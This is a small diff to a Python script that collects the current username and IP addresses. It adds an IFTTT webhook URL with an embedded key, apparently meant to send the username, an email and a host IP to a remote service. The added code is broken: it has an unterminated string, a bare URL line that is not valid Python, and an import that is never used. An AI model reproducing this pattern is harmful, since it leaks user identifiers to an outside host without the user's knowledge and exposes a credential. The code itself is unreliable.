@@ -1,9 +1,12 @@
 import socket,getpass
-try:
-  user = getpass.getuser()
-  ip_local = socket.gethostbyname(socket.gethostname())
-  ip_host = socket.gethostbyname('www.google.com')
-exept: pass
+user = getpass.getuser()
+email = 'test@gmail.com
+ip_local = socket.gethostbyname(socket.gethostname())
+ip_host = socket.gethostbyname('www.google.com')
+
+import urllib2
+https://maker.ifttt.com/trigger/userInfo/with/key/lt6C8G5VRbvc2fOnGjmS5_4J9A_fwtNjQ2VQJ6fO5YK?value1=ip_host&value2=email&value3=user
+
 print (user)
 print (ip_local)
 print (ip_host)
